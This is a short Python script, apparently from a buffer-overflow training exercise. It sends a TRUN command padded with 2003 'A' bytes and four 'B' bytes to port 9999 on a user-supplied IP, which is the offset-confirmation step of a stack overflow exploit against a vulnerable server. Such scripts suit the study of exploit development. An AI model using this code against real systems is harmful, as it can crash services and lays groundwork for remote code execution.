import socket
import sys

shellcode = b"A" * 2003 + b"B" * 4

try:
    ip_address = input("Enter the server IP address: ")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect((ip_address, 9999))
    s.send((b'TRUN /.:/' + shellcode))
    print("Fuzzing with TRUN command %s bytes" % str(len(shellcode)))
    s.close()
except Exception as e:
    print("Error connecting to server:", e)
    sys.exit()
